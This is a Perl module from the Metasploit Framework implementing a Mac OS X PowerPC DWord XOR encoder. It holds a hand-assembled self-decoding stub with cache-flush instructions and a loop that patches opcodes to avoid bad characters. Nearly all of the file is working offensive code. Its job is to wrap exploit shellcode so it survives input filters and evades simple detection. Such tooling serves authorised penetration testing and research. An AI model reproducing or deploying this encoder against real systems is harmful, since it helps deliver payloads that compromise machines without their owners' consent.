
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Encoder::QuackQuack;
use strict;
use base 'Msf::Encoder';
use Pex::Encoder;

my $advanced = 
{

};

my $info = {
    'Name'    => 'MacOS X PPC DWord Xor Encoder',
    'Version' => '1.0',
    'Authors' => [ 'optyx <optyx@uberhax0r.net>',
                   'H D Moore <hdm [at] metasploit.com>' ],
    'Arch'    => [ 'ppc' ],
    'OS'      => [ 'osx' ],
    'Description'  =>  "This is optyx's nifty ppc decoder with coherency tweaks by hdm",
    'Refs'    => [ ],
};

sub new {
    my $class = shift; 
    return($class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_));
}

sub EncodePayload {
    my $self     = shift;
    my $payload  = shift;
    my $badchars = shift;

    my $xor_key   = Pex::Encoder::XorKeyScanDword($payload, $badchars);
    my $xor_data  = Pex::Encoder::XorDword($xor_key, $payload);

    my $encoder = pack("N*", 
        0x7c631a79,  # xor.      r3,r3,r3
        0x4082fffd,  # bnel      0
        0x7da802a6,  # mflr      r13
        0x38c3e041,  # addi      r6,r3,-8127    # 14
        0x39800440,  # li        r12,1088       # 18
        0x39ad1fff,  # addi      r13,r13,8191
        0x81cde045,  # lwz       r14,-8123(r13) # 26
        0x81ede041,  # lwz       r15,-8127(r13) # 30
        0x7def7278,  # xor       r15,r15,r14
        0x91ede041,  # stw       r15,-8127(r13) # 38
        0x7c0668ac,  # dcbf      r6,r13
        0x7c0104ac,  # sync
        0x7c066fac,  # icbi      r6,r13
        0x4c01012c,  # isync    
        0x39adfffc,  # addi      r13,r13,-4
        0x398cfef0,  # addi      r12,r12,-272   # 62
        0x7d8c6379,  # mr.       r12,r12
        0x4082ffd8,  # bne+      decode_loop
	0x3be030ff,  # li        r31, 0x30ff
     	0x7fe04e70,  # srawi     r0, r31, 9
	0x44ffff02,  # sc
        0x7c631a79,  # xor.      r3,r3,r3
        0x7c631a79,  # xor.      r3,r3,r3
        0x7c631a79,  # xor.      r3,r3,r3
    );

    my $icount = (length($payload) / 4);
    my $enc;
    
    foreach my $scale (1 .. 65535) {
        my $size = 8191 - length($payload);
        $enc = $encoder;
        
        # happy fun time opcode patching
        substr($enc, 14, 2, pack('n', -$size -4 + (22 * 4)));
        substr($enc, 18, 2, pack('n', $scale * $icount));
        substr($enc, 26, 2, pack('n', -$size + (22 * 4)));
        substr($enc, 30, 2, pack('n', -$size -4 + (22 * 4)));
        substr($enc, 38, 2, pack('n', -$size -4 + (22 * 4)));        
        substr($enc, 62, 2, pack('n', -$scale));
        if (Pex::Text::BadCharIndex($badchars, $enc) == -1) {
            $enc .= $xor_data . pack('V', $xor_key);
           last;
        }
        undef $enc;
    }
    return $enc;
}

1;
